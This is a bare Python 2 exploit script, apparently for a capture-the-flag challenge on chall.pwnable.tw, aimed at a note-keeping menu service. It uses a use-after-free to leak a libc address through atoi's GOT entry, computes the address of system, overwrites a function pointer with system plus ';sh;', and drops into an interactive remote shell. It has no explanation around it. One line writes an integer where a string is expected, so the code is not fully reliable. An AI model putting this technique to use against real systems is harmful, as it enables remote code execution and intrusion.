import sys, socket, struct, telnetlib, time

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a):
    return struct.pack("<I",a)

def u(a):
    return struct.unpack("<I",a)[0]

def add_note(n, buf):
    read_until(f,"choice :")
    f.write(1)
    read_until(f,"size :")
    f.write(n)
    read_until(f,"Content :")
    f.write(buf) 

def del_note(n):
    read_until(f,"choice :")
    f.write("2")
    read_until(f,"Index :")
    f.write(n)

def print_note(n):
    read_until(f,"choice :")
    f.write("3")
    read_until(f,"Index :")
    f.write(n)

# main
s, f = sock("chall.pwnable.tw", 10102)

offset_libc_system = 0x0003a940
offset_libc_atoi = 0x0002d050
atoi_got = 0x804a034
puts_note = 0x0804862b

if len(sys.argv) == 2 and sys.argv[1] == '-l':
   s, f = sock("localhost", 10102)
   offset_libc_system = 0x00040310
   offset_libc_atoi = 0x000318e0

buf = p(puts_note)
buf += p(atoi_got)

# add 0 1
add_note(16, "A"*16)
add_note(16, "B"*16)

# del 0 1
del_note(0)
del_note(1)

# add 3
add_note(8, buf)

# print 0
print_note(0)

#f.write("4")
leak = u(f.read(4))
print "leak",hex(leak)

libc_base = leak - offset_libc_atoi
system = libc_base + offset_libc_system
print "system",hex(system)

buf = p(system)
buf += ";sh;"

# del 2
del_note(2)

# add 4
add_note(8, buf)

# print 0
print_note(0)

shell(s)
